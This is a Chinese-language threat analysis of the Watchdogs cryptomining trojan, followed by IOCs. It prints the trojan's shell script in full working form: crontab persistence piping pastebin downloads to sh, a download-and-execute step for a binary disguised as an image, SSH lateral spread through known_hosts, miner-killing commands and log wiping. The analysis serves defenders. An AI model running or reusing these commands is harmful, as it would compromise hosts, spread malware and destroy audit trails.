## Watchdogs挖矿木马分析

首先，该脚本实现从 hxxps://pastebin.com/raw/tqJjUD9d 下载文件，文件内容为经过base64编码处理



### shell脚本分析

修改环境变量，将常见的可执行文件目录添加到系统路径中，确保脚本中的shell命令正常执行；同时再次覆写crontab任务。

```
export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin

echo "*/10 * * * * (curl -fsSL https://pastebin.com/raw/sByq0rym||wget -q -O- https://pastebin.com/raw/sByq0rym)|sh" | crontab -
```



清理其他恶意程序，如“kworkerds”，“ddgs”等挖矿程序；同时通过chattr -i等命令解锁和清理相关系统文件

```
ps auxf | grep -v grep | grep hwlh3wlh44lh | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep /usr/bin/.sshd | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep /usr/bin/bsd-port | awk '{print $2}' | xargs kill -9
ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xig" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "wnTKYg" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "sustes" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "thisxxs" | awk '{print $2}' | xargs kill -9
ps auxf|grep -v grep|grep "hashfish" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "kworkerds" | awk '{print $2}'|xargs kill -9
p=$(ps auxf|grep -v grep|grep ksoftirqds|wc -l)
if [ ${p} -eq 0 ];then
    ps auxf|grep -v grep | awk '{if($3>=80.0) print $2}'| xargs kill -9
fi
if [ -e "/tmp/gates.lod" ]; then
    rm -rf $(readlink /proc/$(cat /tmp/gates.lod)/exe)
    kill -9 $(cat /tmp/gates.lod)
    rm -rf $(readlink /proc/$(cat /tmp/moni.lod)/exe)
    kill -9 $(cat /tmp/moni.lod)
    rm -rf /tmp/{gates,moni}.lod
fi
```



根据系统信息下载对应恶意程序执行；黑客主要通过将恶意程序伪装成图片上传hxxp://thyrsi.com图床站点，shell脚本下载hxxp://thyrsi.com/t6/672/1550667515×1822611209.jpg保存为/tmp/watchdogs文件，赋予可执行权限后执行该恶意程序；

```
if [ ! -f "/tmp/.lsdpid" ]; then
    ARCH=$(uname -m)
    if [ ${ARCH}x = "x86_64x" ]; then
        (curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    elif [ ${ARCH}x = "i686x" ]; then
        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    else
        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    fi
        nohup /tmp/watchdogs >/dev/null 2>&1 &
elif [ ! -f "/proc/$(cat /tmp/.lsdpid)/stat" ]; then
    ARCH=$(uname -m)
    if [ ${ARCH}x = "x86_64x" ]; then
        (curl -fsSL http://thyrsi.com/t6/672/1550667479x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667479x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    elif [ ${ARCH}x = "i686x" ]; then
        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    else
        (curl -fsSL http://thyrsi.com/t6/672/1550667515x1822611209.jpg -o /tmp/watchdogs||wget -q http://thyrsi.com/t6/672/1550667515x1822611209.jpg -O /tmp/watchdogs) && chmod +x /tmp/watchdogs
    fi
        nohup /tmp/watchdogs >/dev/null 2>&1 &
fi
```



再进一步横向扩展感染，检查本地 ssh 凭证，遍历/root/.ssh/known_hosts文件中的IP地址，利用默认公钥认证方式进行SSH连接，执行恶意命令横向扩展感染；

```
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://pastebin.com/raw/sByq0rym||wget -q -O- https://pastebin.com/raw/sByq0rym)|sh >/dev/null 2>&1 &' & done
fi
```



最后清空系统日志等文件，清理入侵痕迹。

```
echo 0>/root/.ssh/authorized_keys
echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
```



**基于上面的脚本和ELF样本分析可以发现整体入侵和感染流程大概为：**

1、通过Redis未授权访问漏洞入侵机器并修改crontab任务；或者通过遍历known_hosts中的连接历史进行横向扩展；

2、crontab任务执行bash脚本，进行相关清理和下载执行恶意程序watchdogs并横向扩展：

（1）覆写crontab任务；

（2）清理其他恶意程序；

（3）解锁删除相关系统文件；

（4）下载执行watchdogs；

（5）横向扫描其他机器；

（6）清理相关文件和痕迹。



### IOCs

样本

```
1. aee3a19beb22527a1e0feac76344894c
2. c79db2e3598b49157a8f91b789420fb6
3. d6a146161ec201f9b3f20fbfd528f901
4. 39fa886dd1af5e5360f36afa42ff7b4e
```

矿池地址

```
xmr.f2pool.com:13531
```

钱包地址

```
46FtfupUcayUCqG7Xs7YHREgp4GW3CGvLN4aHiggaYd75WvHM74Tpg1FVEM8fFHFYDSabM3rPpNApEBY4Q4wcEMd3BM4Ava.teny
```

URLs

```
1. hxxps://pastebin.com/raw/sByq0rym
2. hxxps://pastebin.com/raw/tqJjUD9d
3. hxxp://thyrsi.com/t6/672/1550667515x1822611209.jpg
4. hxxp://ident.me
```

